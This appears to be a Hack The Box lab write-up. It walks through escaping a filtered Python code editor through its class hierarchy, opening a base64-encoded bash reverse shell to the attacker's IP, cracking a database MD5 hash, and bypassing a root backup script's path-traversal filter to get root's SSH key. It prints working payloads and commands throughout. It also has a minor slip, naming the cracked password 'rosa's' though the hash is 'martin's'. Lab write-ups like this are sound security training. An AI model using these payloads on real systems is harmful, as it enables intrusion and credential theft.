---
tags:
  - Linux
  - HTTP
  - Python
  - Sandbox escape
  - Sudoers
---

... is an easy HTB machine which offers an sand-boxed (more like bad-word filtered) `python` execution environment, which can be bypassed by walking `python`'s class hierarchy to identify the ID of pre-loaded classes which result in RCE. That ID can then be used to invoke that class and execute OS commands, without ever typing the classes name. For privilege escalation, a custom zipping utility can be executed as root, and its directory traversal safeguards can be easily bypassed.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The `-sV` flag of `nmap` has identified the service on port `5000` to be `http`. I view this service using the `burpsuite` browser on the URL `http://$IP:5000`. The web site displays a `python` code editor, which then shows the resulting `STDOUT`. A forceful browsing attack sadly does not reveal any more sub-directories.

### Initial Exploitation
As the code editor is the only way of interaction right now, i try simply adding a `import` statement, but that instantly gives me the message `Use of restricted keywords is not allowed`. This means that the python is running in a sand-boxed environment which disallows certain keywords like `import` to prevent the use of `import os`.

A quick google search for `python sandbox escapes` leads me to [this github page](https://github.com/yaklang/hack-skills/blob/main/skills/sandbox-escape-techniques/PYTHON_SANDBOX_ESCAPE.md). This introduces a technique of walking `pythons` class hierarchy to display all of the classes which are loaded and accessible. This is done using this command:
```python
print(().__class__.__bases__[0].__subclasses__())
```
This shows a very long list of all functions which are callable from the current execution environment. It is also possible to access these methods by providing the index for each entry, which bypasses the need for actually typing the method name (as it gets filtered). There are a few sub-classes which allow you to execute OS commands without importing new packages, mainly the classes `os._wrap_close` and `subprocess.Popen`.

The following `python` snippet slightly modifies the previous command so that it filters for keywords, and prints the ID of the class (so that it can be used to invoke it without naming it):
```python
for i, x in enumerate(().__class__.__bases__[0].__subclasses__()):
    if 'sub' in str(x): # or 'wrap'
        print(i,x)
```
It turns out that the `os._wrap_close` has the ID `132`, and `subprocess.Popen` has the ID `317`.

To use `os._wrap_close`, the following payload can be used:
```python
().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system']("id")
```
This doesn't work directly, as the keyword `system` is being blocked, but this restriction can be easily bypassed by concatenating two strings like this:
```python
['sys'+'tem']
```

Alternatively, `subprocess.Popen` can be used with the ID `317`:
```python
().__class__.__bases__[0].__subclasses__()[317]("id", shell=True)
```
And this instantly works!

To verify that the commands are actually being executed, i try to ping my local machine with `ping -c 3 <my-IP>`, while listening for `ICMP` (`ping`) packages using the command `sudo tcpdump -i tun0 icmp`. And it works!

For the reverse shell i decided to encode it in `base64`, and then decode and execute it on the target, as it may include forbidden keywords (it would also be possible to fetch a `revshell.sh` from my machine and pipe it into `bash`!). To encode the command i issue:
```bash
echo "bash -c '/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1'" | base64
```
And on the target i decode and execute it with this payload:
```python
().__class__.__bases__[0].__subclasses__()[317]("echo <base64> | base64 -d | bash -i", shell=True)
```
As usual, i start the listener using `nc`:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

And i receive a reverse shell from the user `app-production`!

### Lateral Movement
As the user `app-production` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `martin` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

As i have landed in the `/home/app-production/app` directory, i investigate the back-end logic of the `app.py` application. In there the first lines reveal the `database` connection logic:
```python
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
```
This password is not reusable for `martin`'s `ssh` access though. So i try accessing the database using the `sqlite3` CLI. The `database.db` is located to be in `./instance/database.db`. 

The `sqlite3` `cli` usually throws me into an interactive `sqlite3` shell, but within the reverse shell it's a bit wonky to use it. I could upgrade the reverse shell to make it interactive (or, i could serve the `database.db` file over a new `http` port so that i can view its content on my machine, but opening ports is suspicious...), but instead i simply append the command i want from the `sqlite3` shell so that it returns the output without creating that `shell` environment (`.tables` lists the tables):
```bash
sqlite3 database.db ".tables"
```
With the query `select * from user;` i receive the hash of `martin`!

It seems to be a simple `MD5` hash, which is crackable using `mode 0` of `hashcat`:
```bash
hashcat -m 0 ./hash.txt ./rockyou.txt
```
This gives me the clear-text password to `rosa`'s `ssh`, which is `nafeelswordsmaster`. Alternatively, the clear-text to this hash can be found at the [CrackStation](https://crackstation.net/).

### Privilege Escalation
I try the usual suspects of privilege escalation:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

`martin` is allowed to run `/usr/bin/backy.sh` as root!

After reading the code of `backy.sh`, this is what it does:

- Start it with `sudo /bin/backy.sh ./task.json`, it checks if the file exists. An example `task.json` is found in `/home/martin/backups`:

```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/app-production/app"
  ],
  "exclude": [
    ".*"
  ]
}
```

- It defines that `/var/` and `/home/` are the only directories (also, sub-directories within them) that can be archived, so no `/root/`.
- It removes every `../` in the `"directories_to_archive"` using the `jq` expression `gsub("\\.\\./"; "")`. What this does is replace each `../` with an empty string.
- After checking if the `"directories_to_archive"` is within the directories `/var/` or `/home` and removing instances of `../`, it uses the binary `backy` on that `task.json`. [backy](https://github.com/vdbsh/backy) is a utility found on GitHub which creates file backups using the archiving utility `tar`.

By looking into the `backy` github, i found out that the `"exclude"` options are added to `tar` using the `--exclude` option, which makes it not zip those directories, so i quickly remove the `"exclude"` statement.

Now the only thing left to edit is the `"directories_to_archive"`. I noticed that the removal of `../` only happens once. If i input `....//` only this gets removed:
```bash
.."../"/
# and it results in:
../
```
So i try to zip the folder `/root` using this payload:
```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/....//root"
  ]
}
```
And i receive a `tar.bz2`! I quickly unzip it using `tar -xvjf code_...tar.bz2`, and it creates `/root`'s directory where i opened it!

I could now read the `./root/root.txt` (`Booooo...`), but code execution as `root` is way cooler than just a file read as `root`, so i issue this `ssh` command from `martin`'s bash:
```bash
ssh -i root/.ssh/id_rsa root@localhost
```
This uses `root`'s private key to `ssh` into the machine as him!